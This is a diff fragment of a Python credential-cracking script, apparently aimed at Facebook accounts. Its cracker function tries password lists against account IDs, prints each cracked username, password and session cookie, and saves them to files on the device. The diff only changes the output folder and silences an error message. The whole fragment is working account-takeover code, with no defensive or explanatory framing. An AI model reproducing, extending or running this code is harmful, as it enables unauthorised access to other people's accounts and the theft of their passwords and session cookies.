@@ -325,15 +325,15 @@ def cracker(ids,passlist):
                     if "confirmemail.php" in (response.url +  final.url):
                         print('\033[1;92m [sumon-NV] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/total/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/total/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/BITHI/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
                         print('\033[1;92m [sumon-OK] '+user+' | '+pas+'')
                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/total/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/total/uid.txt","a").write(user+"|"+pas+"\n")
+                        open("/sdcard/BITHI/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        open("/sdcard/BITHI/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
             elif "checkpoint" in log_cookies:
@@ -348,7 +348,7 @@ def cracker(ids,passlist):
     except requests.exceptions.ConnectionError:
         time.sleep(20)
     except Exception as e:
-        print(f"\nError: {e}")
+        #print(f"\nError: {e}")
         pass
 
 
